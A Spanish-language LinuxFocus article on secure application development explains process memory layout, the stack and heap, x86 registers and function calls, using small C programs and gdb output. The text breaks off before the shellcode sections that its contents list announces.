<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//ES">
<HTML>
<HEAD>
 <META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
 <META NAME="GENERATOR" CONTENT="lfparser_2.21">
 <META NAME="LFCATEGORY" CONTENT="Software Development">
<!-- this is used by a number of tools:
 =LF=AUTHOR: Fr&eacute;d&eacute;ric Raynal, Christophe Blaess, Christophe Grenier
 =LF=CAT___: Software Development
 =LF=TITLE_: Evitando agujeros de seguridad al desarrollar una aplicaci&oacute;n - Parte 2: memoria, pila y funciones, c&oacute;digo shell
 =LF=NUMBER: 183
 =LF=ANAME_: article183.html
 -->
 <TITLE>lf183, Software Development: Evitando agujeros de seguridad al desarrollar una aplicaci&oacute;n - Parte 2: memoria, pila y funciones, c&oacute;digo shell</TITLE>
<!-- stylesheet added by lfparser: --> 
<style type="text/css">
<!--
 td.top {font-family: Arial,Geneva,Verdana,Helvetica,sans-serif; font-size:12 }
 pre { font-familiy:monospace,Courier }
 p.cl { color:#EE9500 }
 a.nodec { text-decoration:none }
 p.trans { font-size:8pt; text-align:right }
 p.clbox { width:50%; alignment:center; background-color:#FFD700; border-style:none; border-width:medium; border-color:#FFD700; padding:0.5cm ;  text-align:center }
 p.code { width:80%; alignment:center; background-color:#aedbe8; border-style:none; border-width:medium; border-color:#aedbe8; padding:0.1cm ;  text-align:left }
 p.foot { background-color:#AAAAAA; color:#FFFFFF; border-style:none; border-width:medium; border-color:#AAAAAA; padding:0.5cm ; margin-top:0.1cm; margin-right:1cm; margin-left:1cm; text-align:center }
-->
</style>
 
</HEAD>
<BODY bgcolor="#ffffff" text="#000000">
 <!-- this is generated html code. NEVER use this file for your
 translation work. Instead get the file with the same article number
 and .meta.shtml in its name. Translate this meta file and then
 use lfparser program to generate the final article -->
 <!-- lfparser can be obtained from http://www.linuxfocus.org/~guido/dev/lfparser.html -->

<!-- 2pdaIgnoreStart -->

<!-- start navegation bar -->
 <!-- top navegation bar -->
 <TABLE cellspacing="0" cellpadding="0" border="0" align="center" width="90%">
   <TR bgcolor="#2e2292">
     <TD class="top"><TABLE cellspacing="0" cellpadding="0" border="0" width=
       "100%">
         <TR><TD width="144"><IMG src="../../common/images/logolftop.gif"
           alt="[LinuxFocus-icon]" width="350" height="45" align="left" 
           border="0"></TD>

           <TD class="top">
             <TABLE width="100%">
               <TR align="right">
                 <TD class="top"><A class="nodec" href="../"><FONT color=
                 "#DDDDDD" size="-1">Hogar</FONT></A> &nbsp;|&nbsp; <A class=
                 "nodec" href="../map.html"><FONT color=
                 "#DDDDDD" size="-1">Mapa</FONT></A> &nbsp;|&nbsp; <A class=
                 "nodec" href="../indice.html"><FONT color=
                 "#DDDDDD" size="-1">Indice</FONT></A> &nbsp;|&nbsp; <A class=
                 "nodec" href="../Search/"><FONT color=
                 "#DDDDDD" size="-1">Busqueda</FONT></A> </TD>
               </TR>

               <TR align="right">
                 <TD class="top">
                   <HR width="100%" noshade size="1">
                 </TD>
               </TR>
             </TABLE>
           </TD>
         </TR>
       </TABLE>
     </TD>
   </TR>
 </TABLE>
 <!-- end top navegation bar -->
 <!-- blue bar -->
 <TABLE cellspacing="0" cellpadding="0" border="0" align="center"
 width="90%">
   <TR bgcolor="#00ffff">
     <TD><IMG src="../../common/images/transpix.gif" width="1" height=
     "2" alt=""></TD>
   </TR>
 </TABLE>
 <!-- end blue bar -->
 <!-- bottom navegation bar -->
 <TABLE cellspacing="0" cellpadding="0" border="0" align="center"
 width="94%">
   <TR bgcolor="#000000">
     <TD>
       <TABLE cellspacing="0" cellpadding="1" border="0" width=
       "100%">
         <TR align="center">
           <TD WIDTH="20%"><A class="nodec" href="../News/"><FONT color=
           "#FFFFFF">Noticias</FONT></A> </TD>
           <TD WIDTH="5%"><FONT color="#FFFFFF">|</FONT> </TD>
           <TD WIDTH="20%"><A class="nodec" href="../Archives/"><FONT color=
           "#FFFFFF">Arca</FONT></A> </TD>
           <TD WIDTH="5%"><FONT color="#FFFFFF">|</FONT> </TD>
           <TD WIDTH="20%"><A class="nodec" href="../Links/"><FONT color=
           "#FFFFFF">Enlaces</FONT></A> </TD>
           <TD WIDTH="5%"><FONT color="#FFFFFF">|</FONT> </TD>
           <TD WIDTH="20%"><A class="nodec" href="../aboutus.html"><FONT color=
           "#FFFFFF">Sobre LF</FONT></A> </TD>
         </TR>
       </TABLE>
     </TD>
   </TR>
 </TABLE>
 <!-- end bottom navegation bar -->
<!-- stop navegation bar -->

<!-- SSI_INFO -->

<!--#include virtual="../../dynahead.shtml" -->

<!-- SSI_INFO STOP -->
<!-- 2pdaIgnoreStop -->

<!-- SHORT BIO ABOUT THE AUTHOR -->
<TABLE ALIGN=LEFT BORDER=0  WIDTH="30%" >
<TR>
<TD>

<!-- 2pdaIgnoreStart -->
<!-- PALM DOC -->
<TABLE BORDER=0 hspace=4 vspace=4> <TR> <TD>
<font size=1> <img src="../../common/images/2doc.gif" width=34 align=left border=0 height=22 alt="convert to palm"><a href="http://cgi.linuxfocus.org/cgi-bin/2ztxt">Convert to GutenPalm</a><br>or <a href="http://cgi.linuxfocus.org/cgi-bin/2pda">to PalmDoc</a></font>
</TD> </TR> </TABLE>
<!-- END PALM DOC -->
<!-- 2pdaIgnoreStop -->
<br>
<img SRC="FredCrisBCrisG.jpg" ALT="[image of the authors]" height=150 width=200>
<BR>por  Fr&eacute;d&eacute;ric Raynal, Christophe Blaess, Christophe Grenier <br> <small>&lt;pappy(at)users.sourceforge.net, ccb(at)club-internet.fr, grenier(at)nef.esiea.fr&gt;</small>
<BR><BR>
<I>Sobre el autor:</I><BR>
<P>
Christophe Blaess es un ingeniero en aeron&aacute;utica independiente.
Es un aficionado a Linux y mucho de su trabajo lo hace en este sistema.Coordina
la traduccion de las p&aacute;ginas del manual que se publican en el <i>Linux
Documentation Project</i>.
<p>Christophe Grenier es un estudiante del 5to. a&ntilde;o en ESIEA, donde
tambi&eacute;n trabaja como administrador de sistemas. Es un apasionado
de la seguridad en c&oacute;mputo.
<p>Fr&eacute;d&eacute;ric Raynal ha usado Linux por muchos a&ntilde;os
porque no contamina, no usa hormonas, ni GMO , tampoco grasa animal ...
solamente sudor y trucos.
</P>
<!-- TRANSLATED TO es -->
<BR><BR><I>Taducido al espa&ntilde;ol por:</I><BR>
Victor Manuel Campos Campos  <small>&lt;victor_inmx(at)yahoo.com.mx&gt;</small>
<br>
<!-- TRANSLATED TO STOP -->
<BR><i>Contenidos</i>:
<UL>
  <LI><A HREF="#183lfindex0">
Introducci&oacute;n</A></LI>
  <LI><A HREF="#183lfindex1">
Memory layout</A></LI>
  <LI><A HREF="#183lfindex2">
&iquest;Qu&eacute; es un programa?</A></LI>
  <LI><A HREF="#183lfindex3">
Las diferentes &aacute;reas</A></LI>
  <LI><A HREF="#183lfindex4">
Ejemplo detallado</A></LI>
  <LI><A HREF="#183lfindex5">
La pila (stack) y el mont&oacute;n (heap)</A></LI>
  <LI><A HREF="#183lfindex6">
Los registros</A></LI>
  <LI><A HREF="#183lfindex7">
Las funciones</A></LI>
  <LI><A HREF="#183lfindex8">
Introducci&oacute;n</A></LI>
  <LI><A HREF="#183lfindex9">
El pr&oacute;logo</A></LI>
  <LI><A HREF="#183lfindex10">
La llamada</A></LI>
  <LI><A HREF="#183lfindex11">
El regreso</A></LI>
  <LI><A HREF="#183lfindex12">
Desensamblado</A></LI>
  <LI><A HREF="#183lfindex13">
Creando un c&oacute;digo shell</A></LI>
  <LI><A HREF="#183lfindex14">
Con lenguaje C</A></LI>
  <LI><A HREF="#183lfindex15">
Llamadas de Ensamblador</A></LI>
  <LI><A HREF="#183lfindex16">
Localizando el c&oacute;digo shell dentro de la memoria</A></LI>
  <LI><A HREF="#183lfindex17">
El probema de los bytes null</A></LI>
  <LI><A HREF="#183lfindex18">
Construyendo el c&oacute;digo shell</A></LI>
  <LI><A HREF="#183lfindex19">
Generalizaci&oacute;n y &uacute;ltimos detalles</A></LI>
  <LI><A HREF="#183lfindex20">
Conclusi&oacute;n</A></LI>
  <LI><A HREF="http://cgi.linuxfocus.org/cgi-bin/lftalkback?anum=183&amp;lang=es">Formulario de "talkback" para este art&iacute;culo</A></LI>
</UL>

</TD></TR></TABLE>
<!-- HEAD OF THE ARTICLE -->
<br>&nbsp;
<H2>Evitando agujeros de seguridad al desarrollar una aplicaci&oacute;n - Parte 2: memoria, pila y funciones, c&oacute;digo shell</H2>
 <img SRC="illustration183.gif" ALT="article illustration" HSPACE=10 height=100 width=100>
<!-- ABSTRACT OF THE ARTICLE -->
<P><i>Resumen</i>:
<P>
<P>
Esta serie de art&iacute;culos tratan de enfatizar los principales agujeros
de seguridad que pueden aparecer dentro de las aplicaciones. Muestra maneras
de evitar estos agujeros cambiando un poco los h&aacute;bitos de desarrollo.
<p>Este art&iacute;culo se enfoca en la organizaci&oacute;n y de la memoria,
y explica la relaci&oacute;n entre una funci&oacute;n y la memoria. La
&uacute;ltima secci&oacute;n muestra c&oacute;mo construir <i>shellcode</i>.
</P></P>
<HR size="2" noshade align="right"><BR>
<!-- BODY OF THE ARTICLE -->


<A NAME="183lfindex0">&nbsp;</A>
<H2>
Introducci&oacute;n</H2>

En nuestro art&iacute;culo anterior analizamos los agujeros de seguridad
mas simples, los basados en la ejecuci&oacute;n de comandos externos. Este
art&iacute;culo y el siguiente muestran un tipo de ataque mas amplio, el
desbordamiento del buffer. Primero estudiaremos la estructura en memoria
de una aplicaci&oacute;n en ejecuci&oacute;n, y luego escribiremos una
pieza de c&oacute;digo m&iacute;nima que permita arrancar un shell&nbsp;
(<i>shellcode</i>).
<A NAME="183lfindex1">&nbsp;</A>
<H2>
Memory layout</H2>


<A NAME="183lfindex2">&nbsp;</A>
<H2>
&iquest;Qu&eacute; es un programa?</H2>

Supongamos que un programa es un conjunto de instrucciones, expresado en
c&oacute;digo m&aacute;quina (independientemente del lenguaje usado para
escribirlo) que comunmente llamamos un binario o <i>binary</i>. Al compilarse
para generar el archivo binario, el programa fuente contiene variables,
constantes e&nbsp; instrucciones. Esta secci&oacute;n presenta la distribuci&oacute;n
de la memoria de las diferentes partes del binario.
<A NAME="183lfindex3">&nbsp;</A>
<H2>
Las diferentes &aacute;reas</H2>

Para entender lo que sucede mientras se ejecuta un binario, ech&eacute;mos
un vistazo a la organizaci&oacute;n de la memoria. Recae en diferentes
&aacute;reas:
<center><img SRC="mem.png" ALT="memory layout" height=282 width=210></center>

<p>Generalmente esto no es todo, pero solamente nos enfocamos en las partes
que son mas importantes para este art&iacute;culo.
<p>La orden <tt>size -A <i>file</i> --radix 16</tt> devuelve el tama&ntilde;o
de cada &aacute;rea reservada al compilar. De ah&iacute; obtenemos sus
direcciones de memoria (tambi&eacute;n puede usarse la orden <tt>objdump</tt>
para obtener esta informaci&oacute;n). Aqu&iacute; est&aacute; la salida
de <tt>size</tt> para un binario llamado "fct":
<blockquote>
<pre style="font-familiy:monospace">>>size -A fct --radix 16
fct&nbsp; :
section&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr
.interp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x13&nbsp;&nbsp; 0x80480f4
.note.ABI-tag&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x20&nbsp;&nbsp; 0x8048108
.hash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x30&nbsp;&nbsp; 0x8048128
.dynsym&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x70&nbsp;&nbsp; 0x8048158
.dynstr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x7a&nbsp;&nbsp; 0x80481c8
.gnu.version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xe&nbsp;&nbsp; 0x8048242
.gnu.version_r&nbsp;&nbsp;&nbsp;&nbsp; 0x20&nbsp;&nbsp; 0x8048250
.rel.got&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x8&nbsp;&nbsp; 0x8048270
.rel.plt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x20&nbsp;&nbsp; 0x8048278
.init&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x2f&nbsp;&nbsp; 0x8048298
.plt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x50&nbsp;&nbsp; 0x80482c8
.text&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x12c&nbsp;&nbsp; 0x8048320
.fini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x1a&nbsp;&nbsp; 0x804844c
.rodata&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x14&nbsp;&nbsp; 0x8048468
.data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xc&nbsp;&nbsp; 0x804947c
.eh_frame&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x4&nbsp;&nbsp; 0x8049488
.ctors&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x8&nbsp;&nbsp; 0x804948c
.dtors&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x8&nbsp;&nbsp; 0x8049494
.got&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x20&nbsp;&nbsp; 0x804949c
.dynamic&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xa0&nbsp;&nbsp; 0x80494bc
.bss&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x18&nbsp;&nbsp; 0x804955c
.stab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x978&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0
.stabstr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x13f6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0
.comment&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x16e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0
.note&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x78&nbsp;&nbsp; 0x8049574
Total&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x23c8</pre>
</blockquote>
El &aacute;rea de texto contiene las instrucciones del programa. Esta &aacute;rea
es de solo-lectura. Se comparte entre cada proceso que ejecuta el mismo
binario. Al intentar escribir en esta &aacute;rea se genera un error <i>segmentation
violation</i> .
<p>Antes de explicar las otras &aacute;reas, recordemos algunas cosas acerca
de variables en C. Las variables <i>global</i> son usadas en el programa
completo mientras que las variables locales son usadas solamente dentro
de la funci&oacute;n donde son declaradas. Las variables <i>static</i>
tienen un tama&ntilde;o conocido dependiendo del tipo con que son declaradas.
Los tipos pueden ser <tt>char</tt>, <tt>int</tt>,
<tt>double</tt>, pointers,
etc. En una m&aacute;quina tipo PC, un apuntador representa una direcci&oacute;n
entera de 32 bits dentro de la memoria. Obviamente, el tama&ntilde;o del
&aacute;rea apuntada se desconoce durante la compilaci&oacute;n. Una variable
<i>dynamic</i>
representa un &aacute;rea de memoria expl&iacute;citamente reservada -
realmente es un apuntador que apunta a una direcci&oacute;n de memoria
reservada. Las variables global/local, static/dynamic pueden combinarse
sin problemas.
<p>Regresemos a la organizaci&oacute;n de la memoria para un proceso dado.
El &aacute;rea de <tt>data</tt> almacena los datos est&aacute;ticos globales
inicializados (el valor es proporcionado en el momento de la compilaci&oacute;n),
mientras que el segmento&nbsp; <tt>bss</tt> contiene los datos globales
no inicializados. Estas &aacute;reas se reservan en el momento de la compilaci&oacute;n
dado que su tama&ntilde;o se define de acuerdo con los objetos que contienen.
<p>&iquest;Qu&eacute; hay acerca de variables din&aacute;micas y locales?
Se agrupan en un &aacute;rea de memoria reservada para la ejecuci&oacute;n
del programa (<i>user stack frame</i>). Dado que las funciones pueden invocarse
recursivamente, no se conoce con anticipaci&oacute;n el n&uacute;mero de
instacias de una variable&nbsp; local. Al crearse ser&aacute;n colocadas
en la pila o <i>stack</i>. Esta pila se encuentra hasta arriba de las direcciones
mas altas dentro del espacio de direcciones del usuario, y trabaja de acuerdo
con un modelo LIFO (<i>Last In, First Out</i>). El fondo del &aacute;rea
del marco del usuario o <i>user frame</i> se usa para la colocaci&oacute;n
de variables din&aacute;micas. A esta &aacute;rea se le llama <i>heap</i>
: contiene las &aacute;reas de memoria direccionadas por apuntadores y
variables din&aacute;micas. Al declararse, un apuntador es una variable
de 32 bits, ya sea en BSS o en la pila, y no apunta a alguna direcci&oacute;n
v&aacute;lida. Cuando un proceso obtiene memoria (i.e. usando <i>malloc</i>)
la direcci&oacute;n del primer byte de esa memoria (tambi&eacute;n un n&uacute;mero
de 32 bits) es colocado en el apuntador.
<A NAME="183lfindex4">&nbsp;</A>
<H2>
Ejemplo detallado</H2>

El siguiente ejemplo ilustra la distribuci&oacute;n de la variable en memoria:
<blockquote>
<pre>/* mem.c */

&nbsp; int&nbsp;&nbsp;&nbsp; index = 1;&nbsp;&nbsp; //in data
&nbsp; char * str;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //in bss
&nbsp; int&nbsp;&nbsp;&nbsp; nothing;&nbsp;&nbsp;&nbsp;&nbsp; //in bss

void f(char c)&nbsp;
{
&nbsp; int i;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //in the stack
&nbsp; /* Reserves 5 characters in the heap */
&nbsp; str = (char*) malloc (5 * sizeof (char));
&nbsp; strncpy(str, "abcde", 5);
}

int main (void)
{
&nbsp; f(0);
}</pre>
</blockquote>
El depurador&nbsp; <tt>gdb</tt> confirma todo esto.
<blockquote>
<pre>>>gdb mem
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public
License, and you are welcome to change it and/or distribute
copies of it under certain conditions.&nbsp; Type "show copying"
to see the conditions.&nbsp; There is absolutely no warranty
for GDB.&nbsp; Type "show warranty" for details.&nbsp; This GDB was
configured as "i386-redhat-linux"...
(gdb)</pre>
</blockquote>
Pongamos un punto de rompimiento (breakpoint) en la funci&oacute;n <tt>f()</tt>
y ejecutemos el programa hasta este punto :
<blockquote>
<pre>(gdb) list
7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void f(char c)
8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {
9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int i;
10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; str = (char*) malloc (5 * sizeof (char));
11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strncpy (str, "abcde", 5);
12&nbsp;&nbsp;&nbsp;&nbsp; }
13
14&nbsp;&nbsp;&nbsp;&nbsp; int main (void)
(gdb) break 12
Breakpoint 1 at 0x804842a: file mem.c, line 12.
(gdb) run
Starting program: mem

Breakpoint 1, f (c=0 '\000') at mem.c:12
12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</pre>
</blockquote>
Ahora podemos ver el lugar de las diferentes variables.
<blockquote>
<pre><b>1.</b> (gdb) print &amp;index
$1 = (int *) 0x80494a4
<b>2.</b> (gdb) info symbol 0x80494a4
index in section .data
<b>3.</b> (gdb)&nbsp; print &amp;nothing
$2 = (int *) 0x8049598
<b>4.</b> (gdb) info symbol 0x8049598
nothing in section .bss
<b>5.</b> (gdb) print str
$3 = 0x80495a8 "abcde"
<b>6.</b> (gdb) info symbol 0x80495a8
No symbol matches 0x80495a8.
<b>7.</b> (gdb) print &amp;str
$4 = (char **) 0x804959c
<b>8.</b> (gdb) info symbol 0x804959c
str in section .bss
<b>9.</b> (gdb) x 0x804959c
0x804959c &lt;str>:&nbsp;&nbsp;&nbsp;&nbsp; 0x080495a8
<b>10.</b> (gdb) x/2x 0x080495a8
0x80495a8: 0x64636261&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000065</pre>
</blockquote>
La orden en&nbsp; 1 (<tt>print &amp;index</tt>) muestra la direcci&oacute;n
de memoria para la variable global <tt>index</tt>. La segunda instrucci&oacute;n
(<tt>info</tt>) proporciona el s&iacute;mbolo asociado a esta direcci&oacute;n
y el lugar en la memoria donde puede ser encontrado :
<tt>index</tt>, una
variable est&aacute;tica global inicializada esta almacenada en el &aacute;rea
<tt>data</tt>.
<p>Las instrucciones 3 y 4 confirman que la variable est&aacute;tica no
inicializada
<tt>nothing</tt> puede ser encontrada en el segmento <tt>BSS</tt>.
<p>La l&iacute;nea 5 despliega <tt>str</tt> ... de hecho el contenido de
la variable <tt>str</tt>, o sea la direcci&oacute;n
<tt>0x80495a8</tt>.
La instrucci&oacute;n 6 muestra que no se ha definido una variable en esta
direcci&oacute;n. La orden&nbsp; 7 nos permite obtener la direcci&oacute;n
de la variable
<tt>str</tt>&nbsp; y la orden 8 indica que puede ser encontrada
en el segmento <tt>BSS</tt>.
<p>En la 9, los 4 bytes desplegados corresponden al contenido de la memoria
en la direcci&oacute;n
<tt>0x804959c</tt> : es una direcci&oacute;n reservada
dentroi del&nbsp; heap. El contenido de la 10 muestra nuestra cadena "abcde"
:
<blockquote>
<pre>hexadecimal value : 0x64 63 62 61&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000065
character&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :&nbsp;&nbsp;&nbsp; d&nbsp; c&nbsp; b&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e</pre>
</blockquote>
Las variables locales <tt>c</tt> e <tt>i</tt> estan colocadas en la pila.
<p>Observamos que el tama&ntilde;o devuelto por la orden <tt>size</tt>
para las diferentes &aacute;reas no corresponde con lo que esperabamos
al seguir nuestro programa. La raz&oacute;n es que aparecen otras variables
diferentes declaradas en bibliotecas al ejecutar el programa (variables
tipo <tt>info bajo</tt> <tt>gdb</tt> para generalizar).
<A NAME="183lfindex5">&nbsp;</A>
<H2>
La pila (stack) y el mont&oacute;n (heap)</H2>

Cada vez que se llama a una funci&oacute;n, debe crearse un nuevo ambiente
dentro de la memoria para las variables locales y los par&aacute;metros
de la funci&oacute;n (aqu&iacute; ambiente significa todos los elementos
qeue aparecen mientras se ejecuta una funci&oacute;n : sus argumentos,
sus variables locales, su direcci&oacute;n de regreso en la pila de ejecuci&oacute;n...
este no es el ambiente para las variables shell que mencionamos en el art&iacute;culo
anterior). El registro <tt>%esp</tt> (<i>extended stack pointer</i>) contiene
la direcci&oacute;n de la parte mas alta de la pila, que esta en el fondo
de nuestra representaci&oacute;n, pero seguiremos llamandole la parte alta
para completar la analog&iacute;a con una pila de objetos reales, y apunta
al &uacute;ltimo elemento agragado a la pila; dependiendo de la arquitectura,
este registro puede apuntar algunas veces a al primer espacio libre en
la pila.
<p>La direcci&oacute;n de una variable local dentro de la pila podr&iacute;a
expresarse como un relativo a&nbsp; <tt>%esp</tt>. Sin embargo, siempre
se estan agregando o quitando elementos a la pila, entonces el offeset
de cada variable necesitar&iacute;a ser reajustado y eso es muy ineficiente.
El uso de un segundo apuntador permite mejorar eso : <tt>%ebp</tt> (extended
base pointer) contiene la direcci&oacute;n de inicio del ambiente de la
funci&oacute;n actual. As&iacute;, es suficiente con expresar el <i>offset</i>
relacionado con este registro. Permanece constante mientras se ejecuta
la funci&oacute;n. Ahora es f&aacute;cil encontrar los par&aacute;metros
y variables locales dentro de las funciones.
<p>La unidad b&aacute;sica de la pila es la palabra o <i>word</i> : en
CPU's i386 es de 32 bits, es decir 4 bytes. Esto es diferente en otras
arquitecturas. En CPU's Alpha una palabra es de 64 bits. La pila solamente
maneja palabras, lo que significa que cada variable colocada usa el mismo
tama&ntilde;o de palabra. Veremos esto con mas detalle en la descripci&oacute;n
de una funci&oacute;n prolog. El despliegue del contenido de la variable
<tt>str</tt>
usando <tt>gdb</tt> en el ejemplo anterior lo ilustra. la orden
<tt>gdbx</tt>
despliega una palabra completa de 32 bits (se lee de izquierda a derecha
ya que es una representaci&oacute;n <i>little endian</i>).
<p>La pila es generalmente manipulada con solo dos instrucciones de cpu
:
<ul>
<li>
<tt>push value</tt> : esta instrucci&oacute;n pone el valor en la cima
de la pila. Decrementa <tt>%esp</tt> en una palabra para obtener la direcci&oacute;n
de la siguiente palabra disponile en la pila, y almacena el <tt>value</tt>
dado como un argumento en esa palabra;</li>

<li>
<tt>pop dest</tt> : pone en 'dest' el elemento de la cima de la pila. Pone
en <tt>dest </tt>el valor contenido en la direcci&oacute;n a la que <tt>%esp</tt>
apunta e incrementa el registro <tt>%esp</tt>. Nada es realmente quitado
de la pila, para ser preciso. Solo cambia el apuntador a la cima de la
pila.</li>
</ul>

<A NAME="183lfindex6">&nbsp;</A>
<H2>
Los registros</H2>

&iquest;Qu&eacute; son exactamente los registros? Pueden verse como cajones
que contienen solamente una palabera, mientras que la memoria esta hecha
de una serie de palabras. Cada vez que se coloca un nuevo valor en un registro,
se pierde el valor anterior. Los registros permiten comunicaci&oacute;n
directa entre memoria y CPU.
<p>La primera '<tt>e</tt>' que aparece en el nombre de los registros significa
"<i>extended</i>" e indica la evoluci&oacute;n entre las viejas arquitecturas
de 16 bits y las actuales de 32 bits.
<p>Los registros pueden dividirse en 4 categor&iacute;as :
<ol>
<li>
registros generales : <tt>%eax</tt>, <tt>%ebx</tt>,
<tt>%ecx</tt> and <tt>%edx</tt>
usados para manipular datos;</li>

<li>
registros de segmento : 16bit <tt>%cs</tt>, <tt>%ds</tt>,
<tt>%esx</tt>
and
<tt>%ss</tt>, contienen la primera parte de una direcci&oacute;n de
memoria;</li>

<li>
regsitros de offset : indican un offset relacionado con un registro de
segmento :</li>

<ul>
<li>
<tt>%eip</tt> (<i>Extended Instruction Pointer</i>) : indica la direcci&oacute;n
de la siguiente instrucci&oacute;n que ser&aacute; ejecutada;</li>

<li>
<tt>%ebp</tt> (<i>Extended Base Pointer</i>) : indica el inicio del ambiente
local para una funci&oacute;n;</li>

<li>
<tt>%esi</tt> (<i>Extended Source Index</i>) : contiene el offset los datos
fuente en una operaci&oacute;n que usa un bloque de memoria;</li>

<li>
<tt>%edi</tt> (<i>Extended Destination Index</i>) : contiene el offset
de los datos destino de datos en una operaci&oacute;n que usa un bloque
de memoria;</li>

<li>
<tt>%esp</tt> (<i>Extended Stack Pointer</i>) : la cima de la pila;</li>
</ul>

<li>
registros especiales : son usados &uacute;nicamente por el CPU.</li>
</ol>
Nota: todo lo dicho aqu&iacute; acerca de registros es orientado a x86;
alpha, sparc, etc tienen registros con nombres diferentes pero con funciones
similares.
<A NAME="183lfindex7">&nbsp;</A>
<H2>
Las funciones</H2>


<A NAME="183lfindex8">&nbsp;</A>
<H2>
Introducci&oacute;n</H2>

Esta secci&oacute;n presenta el comportamiento de un programa desde su
llamada hasta su finalizaci&oacute;n. Durante esta secci&oacute;n usaremos
el siguiente ejemplo :
<blockquote>
<pre>/* fct.c */

void toto(int i, int j)
{
&nbsp; char str[5] = "abcde";
&nbsp; int k = 3;
&nbsp; j = 0;
&nbsp; return;
}

int main(int argc, char **argv)
{
&nbsp; int i = 1;
&nbsp; toto(1, 2);
&nbsp; i = 0;
&nbsp; printf("i=%d\n",i);
}</pre>
</blockquote>
El prop&oacute;sito de esta secci&oacute;n es explicar el comportamiento
de las funciones de arriba tomando en cuenta la pila y los registros. Algunosa
ataques tratan de cambiar la manera en que se ejecuta un programa. Para
entenderlos, es &uacute;til conocer lo que sucede normalmente.
<p>La ejecuci&oacute;n de una funci&oacute;n se divide en tres pasos :
